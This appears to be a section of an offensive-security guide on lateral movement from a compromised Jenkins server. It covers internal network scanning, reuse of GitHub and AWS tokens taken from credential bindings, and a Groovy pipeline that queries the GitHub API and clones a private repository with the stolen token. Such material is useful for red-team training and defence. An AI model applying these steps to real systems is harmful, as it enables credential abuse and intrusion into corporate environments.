# Lateral Movement

## Internal Network Scan
- When Jenkins is deployed on premise, it has to potential to reach multiple corporate services and endpoints
- When Jenkins is deployed in cloud, it is reachable to limited on premise corporate services through direct connect.
- Therefore, it is worth performing a network scan to find the reachable services, enumerate ports and see if we can exploit any of the services in corp environment.
- We can also use build logs to find if any such corp environment is accessed through analyzing build logs.

## Enumerating services with access tokens from credential bindings
- If we are successful in dumping tokens or reusing tokens in credentials bindings, we should review what kind of privileges that token hold and what we can do with it.
- For our understanding, let us take an example of github access token.
  - We can try to enumerate various services the token has privileges to perform.
  - So imagine you have access to an admin level personal access token, then there a whole world of possibilites - Dump credentials, backdoor code, etc
  - We can also have access to private repositories and we can view the cloned contents in the workspace :) 
``` Groovy
pipeline{
    agent any
    stages{
        stage('Recon with token'){
            steps{
                withCredentials([usernamePassword(credentialsId: 'github-token', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
                    sh '''
                    curl -s -L \
                        -H "Accept: application/vnd.github+json" \
                        -H "Authorization: Bearer $TOKEN"\
                        -H "X-GitHub-Api-Version: 2022-11-28" \
                        https://api.github.com/user
                    '''
                }
            }
        }
        stage('Clone a private repo with token'){
            steps{
                withCredentials([usernamePassword(credentialsId: 'github-token', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
                    sh '''
                        git clone https://dibsy:$TOKEN@github.com/dibsy/a-temp-private-repo.git
                    '''
                }
            }
        }
    }
}
```

<img src="lateral-api.png">
          
<img src="lateral-private.png">

## Creating resources with with access tokens from credential bindings
- Similarly like Github, we can try to enumerate services with the AWS Access Token
- If we have enough privileges, we can create new AWS services with the AWS tokens - For example create an ec2 with remote ssh privileges.
- This will not only help in moving laterally, we can use this as foothold to carry out attacks ( where we can install many tools )


